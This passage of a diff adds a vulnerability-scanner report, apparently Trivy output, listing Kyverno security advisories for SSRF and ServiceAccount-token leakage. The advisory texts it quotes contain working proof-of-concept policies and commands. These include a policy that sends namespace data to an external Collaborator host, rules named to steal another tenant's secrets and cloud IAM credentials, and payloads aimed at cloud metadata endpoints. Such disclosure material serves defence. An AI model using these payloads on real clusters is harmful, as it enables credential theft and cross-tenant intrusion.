+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H",
+              "V3Score": 9.1
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 8.1
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H",
+              "V3Score": 9.1
+            }
+          },
+          "References": [
+            "https://github.com/kyverno/kyverno",
+            "https://github.com/kyverno/kyverno/commit/bc4f91c4801b1eaa2edc0a14e2f1b0af8cf0c1f5",
+            "https://github.com/kyverno/kyverno/commit/c2eab00033e635bda4e4efb58c1b472b41728bb6",
+            "https://github.com/kyverno/kyverno/commit/f70e8ac1e7acd2e3844f9553e4a884f07f953de0",
+            "https://github.com/kyverno/kyverno/security/advisories/GHSA-f9g8-6ppc-pqq4",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-41323"
+          ],
+          "PublishedDate": "2026-04-24T04:16:20.593Z",
+          "LastModifiedDate": "2026-06-17T10:46:30.423Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-459x-q9hg-4gpq",
+          "PkgID": "github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "PkgName": "github.com/kyverno/kyverno",
+          "PkgIdentifier": {
+            "PURL": "pkg:golang/github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43%2Bdirty",
+            "UID": "8f10599cdbdab282"
+          },
+          "InstalledVersion": "v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "Status": "affected",
+          "Layer": {
+            "Digest": "sha256:ef929f7c472662195a3ed5cf5271ef88a07cff62e3014e094a1a1ef60f912bd0",
+            "DiffID": "sha256:bf6be559b4b3e4ec728c57164db7f34023ea2721af661b6c7746f3001527cff5"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-459x-q9hg-4gpq",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Go",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"
+          },
+          "Fingerprint": "sha256:358ed48ce24d4a893f45631bcc89205981accd9058177ec6f885d9895a6b5d5b",
+          "Title": "Kyverno vulnerable to SSRF via Service Calls",
+          "Description": "### Summary\nAn attacker with the ability to create Kyverno policies in a Kubernetes cluster can use Service Call functionality to perform SSRF to a server under their control in order to exfiltrate data.\n\n### Details\nAccording to the documentation, Service Call is intended to address services located inside the Kubernetes cluster, but this method can also resolve external addresses, which allows making requests outside the Kubernetes cluster.\n\nhttps://kyverno.io/docs/writing-policies/external-data-sources/#variables-from-service-calls\n\n### PoC\nCreate a slightly modified Cluster Policy from the documentation. In the url we specify the address of a server controlled by the attacker, for example Burp Collaborator.\n```yaml\napiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: check-namespaces      \nspec:\n  rules:\n  - name: call-extension\n    match:\n      any:\n      - resources:\n          kinds:\n          - ConfigMap\n    context:\n    - name: result\n      apiCall:\n        method: POST\n        data:\n        - key: namespace\n          value: \"{{request.namespace}}\"\n        service:\n          url: http://bo3gyn4qwyjnrx87fjnrsd4p7gd71xpm.oastify.com/payload          \n    validate:\n      message: \"namespace {{request.namespace}} is not allowed\"\n      deny:\n        conditions:\n          all:\n          - key: \"{{ result.allowed }}\"\n            operator: Equals\n            value: false\n```\nNow let's create some configmap:\n```bash\nkubectl create configmap special-config --from-literal=special.how=very --from-literal=special.type=charm\n```\nLook at the Burp Collaborator logs:\n<img width=\"723\" alt=\"Снимок экрана 2025-02-21 в 17 31 25\" src=\"https://github.com/user-attachments/assets/9445a71a-6687-430a-8476-3fd546bc2bf2\" />\n\n\n### Impact\nAn attacker creating such a policy can obtain the contents of all Kubernetes resources created in the cluster, including secrets containing sensitive information.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:P",
+              "V40Score": 7.7
+            }
+          },
+          "References": [
+            "https://github.com/kyverno/kyverno",
+            "https://github.com/kyverno/kyverno/security/advisories/GHSA-459x-q9hg-4gpq",
+            "https://pkg.go.dev/vuln/GO-2025-3615"
+          ],
+          "PublishedDate": "2025-04-15T21:19:37Z",
+          "LastModifiedDate": "2025-04-23T15:11:02Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-8wfp-579w-6r25",
+          "PkgID": "github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "PkgName": "github.com/kyverno/kyverno",
+          "PkgIdentifier": {
+            "PURL": "pkg:golang/github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43%2Bdirty",
+            "UID": "8f10599cdbdab282"
+          },
+          "InstalledVersion": "v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "FixedVersion": "1.17.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:ef929f7c472662195a3ed5cf5271ef88a07cff62e3014e094a1a1ef60f912bd0",
+            "DiffID": "sha256:bf6be559b4b3e4ec728c57164db7f34023ea2721af661b6c7746f3001527cff5"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-8wfp-579w-6r25",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Go",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"
+          },
+          "Fingerprint": "sha256:16086b1d27f76117659394fc0421449adfadeb38889960dea430fe1a9ab82bb7",
+          "Title": "Kyverno apiCall automatically forwards ServiceAccount token to external endpoints (credential leak)",
+          "Description": "### Summary\nKyverno's apiCall service mode automatically attaches the admission controller's ServiceAccount (SA) token to outbound HTTP requests. This results in unintended credential exposure when requests are sent to external or attacker-controlled endpoints.\n\nThe behavior is insecure-by-default and not documented, enabling token exfiltration without requiring policy authors to explicitly opt in.\n\n---\n\n### Details\n\nKyverno's apiCall executor (`pkg/engine/apicall/executor.go`) reads the ServiceAccount token from:\n\n`/var/run/secrets/kubernetes.io/serviceaccount/token`\n\nand injects it into every HTTP request as:\n\n```\nAuthorization: Bearer <token>\n```\n\nThis occurs when no explicit `Authorization` header is defined in the policy.\n\n#### Root cause\n\n```go\nif req.Header.Get(\"Authorization\") == \"\" {\n    token := a.getToken()\n    if token != \"\" {\n        req.Header.Add(\"Authorization\", \"Bearer \"+token)\n    }\n}\n```\n\nThis logic introduces several issues:\n\n- **Implicit credential forwarding** to arbitrary endpoints\n- **No trust boundary validation** (external/internal distinction)\n- **Undocumented behavior**\n- **Header.Add instead of Set** allows duplication\n- **No token sanitization** (potential trailing newline)\n\n---\n\n### PoC\n\n#### Preconditions\n\n- Kyverno installed (v1.17.1 tested)\n- A policy using `apiCall.service.url`\n\n---\n\n#### Step 1 — Deploy capture server\n\n```bash\nkubectl run capture --image=python:3-slim --restart=Never -- \\\npython3 -c \"\nimport http.server\nclass H(http.server.BaseHTTPRequestHandler):\n def do_GET(self):\n  print(self.headers.get('Authorization'), flush=True)\n  self.send_response(200)\n  self.end_headers()\nhttp.server.HTTPServer(('0.0.0.0',8888),H).serve_forever()\"\nkubectl expose pod capture --port=8888\n```\n\n---\n\n#### Step 2 — Create policy\n\n```yaml\napiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: token-leak\nspec:\n  rules:\n  - name: test\n    match:\n      any:\n      - resources:\n          kinds: [\"Pod\"]\n    context:\n    - name: r\n      apiCall:\n        method: GET\n        service:\n          url: \"http://capture.default.svc:8888\"\n        jmesPath: \"@\"\n```\n\n---\n\n#### Step 3 — Trigger\n\n```bash\nkubectl run test --image=nginx\n```\n\n---\n\n#### Step 4 — Observe token\n\n```bash\nkubectl logs capture\n```\n\nOutput:\n\n```\nAuthorization: Bearer <SA_TOKEN>\n```\n\n---\n\n### Impact\n\n#### Vulnerability class\n- Credential exposure / leakage\n\n#### Impact details\n\n- Exposure of Kubernetes ServiceAccount token\n- Token grants:\n  - Full control over Kyverno policies\n  - Ability to create/delete webhooks\n  - Read cluster-wide resources\n  - Privilege escalation and persistence",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+              "V3Score": 7.7
+            }
+          },
+          "References": [
+            "https://github.com/kyverno/kyverno",
+            "https://github.com/kyverno/kyverno/security/advisories/GHSA-8wfp-579w-6r25"
+          ],
+          "PublishedDate": "2026-04-16T21:37:29Z",
+          "LastModifiedDate": "2026-04-16T21:37:29Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-fmqp-4wfc-w3v7",
+          "PkgID": "github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "PkgName": "github.com/kyverno/kyverno",
+          "PkgIdentifier": {
+            "PURL": "pkg:golang/github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43%2Bdirty",
+            "UID": "8f10599cdbdab282"
+          },
+          "InstalledVersion": "v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "FixedVersion": "1.16.2",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:ef929f7c472662195a3ed5cf5271ef88a07cff62e3014e094a1a1ef60f912bd0",
+            "DiffID": "sha256:bf6be559b4b3e4ec728c57164db7f34023ea2721af661b6c7746f3001527cff5"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-fmqp-4wfc-w3v7",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Go",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"
+          },
+          "Fingerprint": "sha256:791be0961c021875ced3a64415ef1182faf47cd6026ccd98483505cddcb8cbbe",
+          "Title": "Kyverno APICall SSRF Vulnerability Leading to Multi-Tenant Isolation Breach",
+          "Description": "### Summary\n\nKyverno's APICall feature contains a Server-Side Request Forgery (SSRF) vulnerability that allows users with Policy creation permissions to access arbitrary internal resources through Kyverno's high-privilege ServiceAccount. In multi-tenant Kubernetes environments, this constitutes a classic Confused Deputy problem: low-privilege tenants can steal sensitive data from other tenants (such as database passwords and API keys) and cloud platform IAM credentials, completely breaking tenant isolation. This vulnerability does not require cluster-admin privileges and can be exploited with only namespace-level Policy creation permissions.\n\n### Details\n\n#### Vulnerability Mechanism\n\nKyverno's APICall feature allows Policies to fetch external data via HTTP requests. This feature does not validate target URLs when executing HTTP requests, leading to an SSRF vulnerability.\n\n**Source Point - User-Controlled URL**\n\nFile: `api/kyverno/v1/common_types.go`, lines 247-250\n\n```go\ntype ServiceCall struct {\n    // URL is the JSON web service URL\n    URL string `json:\"url\"`  // User-controlled, no validation\n    Headers []HTTPHeader `json:\"headers,omitempty\"`\n    CABundle string `json:\"caBundle,omitempty\"`\n}\n```\n\nThe URL field is completely controlled by users through Policy configuration, with no validation mechanism to restrict target addresses.\n\n**Sink Point - HTTP Request Execution**\n\nFile: `pkg/engine/apicall/executor.go`, lines 65-110\n\n```go\nfunc (a *executor) executeServiceCall(ctx context.Context, apiCall *kyvernov1.APICall) ([]byte, error) {\n    if apiCall.Service == nil {\n        return nil, fmt.Errorf(\"missing service for APICall %s\", [a.name](http://a.name/))\n    }\n\n    client, err := a.buildHTTPClient(apiCall.Service)\n    if err != nil {\n        return nil, err\n    }\n\n    req, err := a.buildHTTPRequest(ctx, apiCall)\n    if err != nil {\n        return nil, fmt.Errorf(\"failed to build HTTP request for APICall %s: %w\", [a.name](http://a.name/), err)\n    }\n\n    // Line 80: Directly executes HTTP request without URL validation\n    resp, err := client.Do(req)\n    if err != nil {\n        return nil, fmt.Errorf(\"failed to execute HTTP request for APICall %s: %w\", [a.name](http://a.name/), err)\n    }\n    defer resp.Body.Close()\n\n    // Read and return response content\n    body, err := io.ReadAll(resp.Body)\n    if err != nil {\n        // ...\n    }\n\n    return body, nil\n}\n```\n\nLine 80's `client.Do(req)` directly executes the HTTP request without checking if the target URL is an internal IP address (like 169.254.169.254) or resources belonging to other tenants.\n\n**Confused Deputy Problem**\n\nIn multi-tenant environments, Kyverno uses a cluster-wide high-privilege ServiceAccount to execute all APICall requests. When a low-privilege tenant creates a Policy containing malicious APICall directives, Kyverno executes these requests with its own high privileges, leading to privilege escalation.\n\nAttack path:\n```\nTenant A (namespace-level permissions)\n  → Creates malicious Policy\n  → Kyverno (cluster-wide high privileges)\n  → Accesses Tenant B's Secrets / Cloud metadata service\n  → Sensitive data leaked to PolicyReport\n  → Tenant A reads PolicyReport to obtain data\n```\n\n### PoC\n\n#### Environment Setup\n\n**Prerequisites**\n- Kubernetes cluster \n- Kyverno v1.16.0 installed\n- Mock cloud metadata service (optional, for testing cloud credential theft)\n\n**Step 1: Install Kyverno**\n\n```bash\nkubectl create namespace kyverno\nkubectl create -f https://github.com/kyverno/kyverno/releases/download/v1.16.0/install.yaml\nkubectl wait --for=condition=Ready pods --all -n kyverno --timeout=300s\n```\n\nVerify installation:\n```bash\n$ kubectl get pods -n kyverno\nNAME                                             READY   STATUS    RESTARTS   AGE\nkyverno-admission-controller-5c84845f5-28hz5     1/1     Running   0          2m\nkyverno-background-controller-59b7b8d686-7pqxl   1/1     Running   0          2m\nkyverno-cleanup-controller-5fd988d64f-nsgdb      1/1     Running   0          2m\nkyverno-reports-controller-546cb78fbc-2dd74      1/1     Running   0          2m\n```\n\n**Step 2: Deploy Mock Metadata Service**\n\nCreate file `metadata-mock.yaml`:\n\n```yaml\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: metadata-mock\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metadata-mock\n  namespace: metadata-mock\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: metadata-mock\n  template:\n    metadata:\n      labels:\n        app: metadata-mock\n    spec:\n      containers:\n      - name: mock-server\n        image: python:3.9-slim\n        command: [\"python\", \"-c\"]\n        args:\n        - |\n          import http.server\n          import socketserver\n          import json\n\n          class Handler(http.server.SimpleHTTPRequestHandler):\n              def do_GET(self):\n                  if 'iam/security-credentials/test-role' in self.path:\n                      self.send_response(200)\n                      self.send_header('Content-type', 'application/json')\n                      self.end_headers()\n                      creds = {\n                          \"AccessKeyId\": \"AKIAIOSFODNN7EXAMPLE\",\n                          \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n                          \"Token\": \"SimulatedSessionToken123456\",\n                          \"Expiration\": \"2025-12-31T23:59:59Z\"\n                      }\n                      self.wfile.write(json.dumps(creds).encode())\n                  else:\n                      self.send_response(404)\n                      self.end_headers()\n\n          with socketserver.TCPServer((\"\", 80), Handler) as httpd:\n              httpd.serve_forever()\n        ports:\n        - containerPort: 80\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: metadata-mock\n  namespace: metadata-mock\nspec:\n  selector:\n    app: metadata-mock\n  ports:\n  - port: 80\n    targetPort: 80\n```\n\nDeploy:\n```bash\nkubectl apply -f metadata-mock.yaml\nkubectl wait --for=condition=Ready pods --all -n metadata-mock --timeout=120s\n```\n\n**Step 3: Create Multi-Tenant Environment**\n\nCreate two tenant namespaces:\n```bash\nkubectl create namespace tenant-a\nkubectl create namespace tenant-b\n```\n\nCreate sensitive data in tenant-b:\n```bash\nkubectl create secret generic db-credentials -n tenant-b \\\n  --from-literal=username=admin \\\n  --from-literal=password=SuperSecret123! \\\n  --from-literal=database=production-db\n```\n\nCreate restricted ServiceAccount for tenant-a:\n```bash\nkubectl create serviceaccount tenant-a-admin -n tenant-a\n```\n\nCreate file `tenant-a-rbac.yaml`:\n```yaml\napiVersion: [rbac.authorization.k8s.io/v1](http://rbac.authorization.k8s.io/v1)\nkind: Role\nmetadata:\n  name: policy-creator\n  namespace: tenant-a\nrules:\n- apiGroups: [\"[kyverno.io](http://kyverno.io/)\"]\n  resources: [\"policies\"]\n  verbs: [\"create\", \"get\", \"list\", \"update\", \"patch\", \"delete\"]\n- apiGroups: [\"\"]\n  resources: [\"configmaps\"]\n  verbs: [\"create\", \"get\", \"list\"]\n- apiGroups: [\"[wgpolicyk8s.io](http://wgpolicyk8s.io/)\"]\n  resources: [\"policyreports\"]\n  verbs: [\"get\", \"list\"]\n---\napiVersion: [rbac.authorization.k8s.io/v1](http://rbac.authorization.k8s.io/v1)\nkind: RoleBinding\nmetadata:\n  name: tenant-a-policy-creator\n  namespace: tenant-a\nroleRef:\n  apiGroup: [rbac.authorization.k8s.io](http://rbac.authorization.k8s.io/)\n  kind: Role\n  name: policy-creator\nsubjects:\n- kind: ServiceAccount\n  name: tenant-a-admin\n  namespace: tenant-a\n```\n\nApply configuration:\n```bash\nkubectl apply -f tenant-a-rbac.yaml\n```\n\n**Step 4: Verify Permission Isolation**\n\nCreate test Pod:\n```bash\nkubectl run tenant-a-test -n tenant-a \\\n  --image=bitnami/kubectl:latest \\\n  --serviceaccount=tenant-a-admin \\\n  --command -- sleep 3600\n```\n\nVerify tenant-a cannot directly access tenant-b:\n```bash\n$ kubectl exec -n tenant-a tenant-a-test -- kubectl get secrets -n tenant-b\nError from server (Forbidden): secrets is forbidden: User \"system:serviceaccount:tenant-a:tenant-a-admin\" cannot list resource \"secrets\" in API group \"\" in the namespace \"tenant-b\"\n```\n\nThis confirms that tenant-a's ServiceAccount indeed cannot directly access tenant-b's resources.\n\n#### Exploitation\n\n**Step 1: Create Malicious Policy**\n\nCreate file `confused-deputy-attack.yaml`:\n\n```yaml\napiVersion: [kyverno.io/v1](http://kyverno.io/v1)\nkind: Policy\nmetadata:\n  name: confused-deputy-attack\n  namespace: tenant-a\nspec:\n  background: true\n  validationFailureAction: Audit\n  rules:\n  - name: steal-tenant-b-secrets\n    match:\n      any:\n      - resources:\n          kinds:\n          - ConfigMap\n    context:\n    - name: tenantBSecrets\n      apiCall:\n        method: GET\n        urlPath: \"/api/v1/namespaces/tenant-b/secrets/db-credentials\"\n    validate:\n      message: \"STOLEN TENANT-B SECRETS - Username: {{ tenantBSecrets.data.username | base64_decode(@) }}, Password: {{ tenantBSecrets.data.password | base64_decode(@) }}, Database: {{ tenantBSecrets.data.database | base64_decode(@) }}\"\n      pattern:\n        metadata:\n          labels:\n            force-fail: \"true\"\n  - name: steal-cloud-credentials\n    match:\n      any:\n      - resources:\n          kinds:\n          - ConfigMap\n    context:\n    - name: cloudCreds\n      apiCall:\n        method: GET\n        service:\n          url: \"http://metadata-mock.metadata-mock.svc.cluster.local/latest/meta-data/iam/security-credentials/test-role\"\n    validate:\n      message: \"STOLEN CLOUD CREDENTIALS - AccessKeyId: {{ cloudCreds.AccessKeyId }}, SecretAccessKey: {{ cloudCreds.SecretAccessKey }}\"\n      pattern:\n        metadata:\n          labels:\n            force-fail-cloud: \"true\"\n```\n\nApply Policy:\n```bash\n$ kubectl apply -f confused-deputy-attack.yaml\n[policy.kyverno.io/confused-deputy-attack](http://policy.kyverno.io/confused-deputy-attack) created\n```\n\n**Step 2: Trigger Policy Execution**\n\nCreate ConfigMap to trigger Policy:\n```bash\n$ kubectl create configmap attack-trigger -n tenant-a --from-literal=trigger=now\nconfigmap/attack-trigger created\n```\n\n**Step 3: View Stolen Data**\n\nAfter a few seconds, check PolicyReport:\n```bash\n$ kubectl get policyreport -n tenant-a -o yaml | grep -A 5 \"STOLEN\"\n```\n\nActual output:\n```yaml\n- message: 'validation error: STOLEN TENANT-B SECRETS - Username: admin, Password:\n    SuperSecret123!, Database: production-db. rule steal-tenant-b-secrets failed\n    at path /metadata/labels/'\n  policy: tenant-a/confused-deputy-attack\n  result: fail\n  rule: steal-tenant-b-secrets\n--\n- message: 'validation error: STOLEN CLOUD CREDENTIALS - AccessKeyId: AKIAIOSFODNN7EXAMPLE,\n    SecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY. rule steal-cloud-credentials\n    failed at path /metadata/labels/'\n  policy: tenant-a/confused-deputy-attack\n  result: fail\n  rule: steal-cloud-credentials\n```\n\nAttack successful. Tenant-a has stolen through Kyverno:\n1. Tenant-b's database credentials (username: admin, password: SuperSecret123!, database: production-db)\n2. Cloud platform IAM credentials (AccessKeyId and SecretAccessKey)\n\n**Step 4: Verify Kyverno Logs**\n\nCheck Kyverno admission controller logs:\n```bash\n$ kubectl logs -n kyverno deployment/kyverno-admission-controller --tail=100 | grep -i \"apicall\"\n2026-01-06T14:40:34Z INFO DefaultContextLoaderFactory apicall/apiCall.go:151 executed service APICall {\"name\": \"cloudCredentials\", \"len\": 180}\n```\n\nLogs show APICall executed successfully, returning 180 bytes of data (exactly the JSON length of the mock credentials).\n\n### Impact\n\nThis is a critical security vulnerability with particularly severe impact in multi-tenant Kubernetes environments.\n\n**Affected Environments**\n- All multi-tenant Kubernetes clusters using Kyverno\n- Environments granting users namespace-level Policy creation permissions\n- Clusters running on cloud platforms (AWS EKS, GCP GKE, Azure AKS)\n\n**Vulnerability Impact**\n\n1. Complete Multi-Tenant Isolation Breach\n   - Tenants can read other tenants' Secrets (database passwords, API keys, etc.)\n   - Tenants can access other tenants' ConfigMaps and other resources\n   - Completely violates security assumptions of multi-tenant environments\n\n2. Cloud Platform Credential Leakage\n   - Can access cloud metadata service (169.254.169.254)\n   - Obtain node IAM role credentials\n   - Use these credentials to access cloud platform resources (S3, RDS, GCS, etc.)\n\n3. Lateral Movement\n   - Extend from Kubernetes cluster permissions to cloud platform resource access\n   - Potentially access other tenants' cloud resources\n   - Further penetration in cloud environments\n\n4. Confused Deputy Problem\n   - Low-privilege users leverage high-privilege proxy (Kyverno) to execute privileged operations\n   - Bypass RBAC permission controls\n   - Difficult to trace actual attackers through audit logs\n\n**Severity Assessment**\n\n- CVSS 3.1 Score: 8.5 (Critical)\n- CWE Classification: CWE-918 (Server-Side Request Forgery)\n\n\nIn multi-tenant environments, the severity of this vulnerability is much higher than in single-tenant environments because it does not require cluster-admin privileges and can be exploited with only namespace-level Policy creation permissions.\n\n**Real-World Scenario Risks**\n\nScenario 1: SaaS Multi-Tenant Platform\n- Each customer has one namespace\n- Customer A can steal Customer B's database passwords and API keys\n- Leads to data breaches, compliance violations, loss of customer trust\n\nScenario 2: Enterprise Internal Multi-Team Shared Cluster\n- Different business teams share one Kubernetes cluster\n- Team A can steal Team B's production database credentials\n- Leads to internal data breaches, production incidents\n\nScenario 3: Cloud Platform Managed Kubernetes\n- Running on AWS EKS, GCP GKE, Azure AKS\n- Tenants can obtain node IAM role credentials\n- Access cloud platform resources, lateral movement to cloud environment\n\n**Remediation Recommendations**\n\nImmediate measures:\n1. Disable APICall feature in multi-tenant environments\n2. Restrict Policy creation permissions to cluster-admin only\n3. Use NetworkPolicy to restrict Kyverno Pod egress traffic\n\nLong-term fixes:\n1. Add URL validation in executeServiceCall function to block internal IP addresses\n2. Use separate low-privilege ServiceAccount for APICall\n3. Implement URL whitelist mechanism\n4. Audit and monitor all APICall requests",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+              "V3Score": 7.7
+            }
+          },
+          "References": [
+            "https://github.com/kyverno/kyverno",
+            "https://github.com/kyverno/kyverno/security/advisories/GHSA-fmqp-4wfc-w3v7"
+          ],
+          "PublishedDate": "2026-04-14T20:06:09Z",
+          "LastModifiedDate": "2026-04-14T20:06:09Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-qr4g-8hrp-c4rw",
+          "PkgID": "github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "PkgName": "github.com/kyverno/kyverno",
+          "PkgIdentifier": {
+            "PURL": "pkg:golang/github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43%2Bdirty",
+            "UID": "8f10599cdbdab282"
+          },
+          "InstalledVersion": "v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "Status": "affected",
+          "Layer": {
+            "Digest": "sha256:ef929f7c472662195a3ed5cf5271ef88a07cff62e3014e094a1a1ef60f912bd0",
+            "DiffID": "sha256:bf6be559b4b3e4ec728c57164db7f34023ea2721af661b6c7746f3001527cff5"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-qr4g-8hrp-c4rw",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Go",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"
+          },
+          "Fingerprint": "sha256:6828a96e50a40c27abedb832f9053821a059d510f754445e7249a5156cc5b660",
+          "Title": "Kyverno has unrestricted outbound requests in Kyverno apiCall enabling SSRF",
+          "Description": "### Summary\nA Server-Side Request Forgery (SSRF) vulnerability in Kyverno allows authenticated users to induce the admission controller to send arbitrary HTTP requests to attacker-controlled endpoints.\n\nWhen a `ClusterPolicy` uses `apiCall.service.url` with variable substitution (e.g. `{{request.object.*}}`), user-controlled input can influence the request target. The Kyverno admission controller executes these requests from its privileged network position without enforcing any validation or network restrictions.\n\nThe issue becomes **non-blind SSRF**, as response data from internal services can be reflected back to the user via admission error messages.\n\n---\n\n### Details\n\nKyverno supports variable substitution in `apiCall.service.url`, a documented feature intended to enable dynamic external lookups during admission control.\n\nHowever, the current implementation lacks fundamental safeguards in the HTTP execution path:\n\n#### Missing protections\n\n- **No URL validation**  \n  User-controlled input is directly embedded into the request URL without validation or normalization.\n\n- **No IP filtering**  \n  Requests can target:\n  - Loopback (`127.0.0.1`)\n  - Link-local (`169.254.0.0/16`)\n  - Cloud metadata services (e.g. AWS IMDS)\n  - Internal ClusterIP services\n\n- **Redirect handling not restricted**  \n  The Go HTTP client uses default redirect behavior (`CheckRedirect == nil`), allowing up to 10 redirects without re-validation of the target.\n\n- **Response data reflection in admission errors**  \n  Response bodies are propagated back to the user in admission responses under certain conditions.\n\n#### Non-blind SSRF behavior\n\nThe vulnerability is **non-blind** through two mechanisms:\n\n1. **Non-2xx responses**  \n   Response body is returned in admission error messages (e.g. `executor.go:98-101`)\n\n2. **2xx responses with non-JSON content**  \n   Parsing failures (JSON/JMESPath) include response snippets in error output\n\nThis allows attackers to retrieve data from internal services directly via `kubectl` output.\n\n---\n\n### PoC\n\n#### Preconditions\n\n1. A `ClusterPolicy` using:\n```yaml\napiCall:\n  service:\n    url: \"http://{{ request.object.metadata.annotations.target }}\"\n```\n\n2. An authenticated user able to create matching resources (e.g. Pods)\n\n---\n\n#### Step 1 — Create malicious resource\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: ssrf-test\n  annotations:\n    target: \"169.254.169.254/latest/meta-data/iam/security-credentials/\"\nspec:\n  containers:\n  - name: test\n    image: nginx\n```\n\n---\n\n#### Step 2 — Apply resource\n\n```bash\nkubectl apply -f pod.yaml\n```\n\n---\n\n#### Step 3 — Observe output\n\nExample output:\n\n```text\nError from server: admission webhook \"kyverno\" denied the request:\nfailed to process apiCall: <response body from metadata service>\n```\n\n---\n\n#### Variations\n\n- Internal services:\n  http://kubernetes.default.svc\n- Loopback:\n  http://127.0.0.1:8080\n- Redirect chains to bypass naive filters\n\n---\n\n### Impact\n\n#### Vulnerability class\n- Server-Side Request Forgery (SSRF)\n- Non-blind data exfiltration\n\n#### Affected scope\n- Kubernetes clusters using Kyverno policies with `apiCall.service.url` and variable substitution\n\n#### Impact details\n\n- Access to internal services (ClusterIP, localhost)\n- Access to cloud metadata endpoints (e.g. IMDSv1 → credential exposure)\n- Internal network reconnaissance\n- Multi-tenant boundary weakening\n\nThis issue can be combined with automatic ServiceAccount token forwarding (reported separately) to form a **critical attack chain**.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+              "V3Score": 7.7
+            }
+          },
+          "References": [
+            "https://github.com/kyverno/kyverno",
+            "https://github.com/kyverno/kyverno/security/advisories/GHSA-qr4g-8hrp-c4rw"
+          ],
+          "PublishedDate": "2026-04-14T20:05:52Z",
+          "LastModifiedDate": "2026-04-14T20:05:52Z"
+        }
+      ]
+    }
+  ]
+}
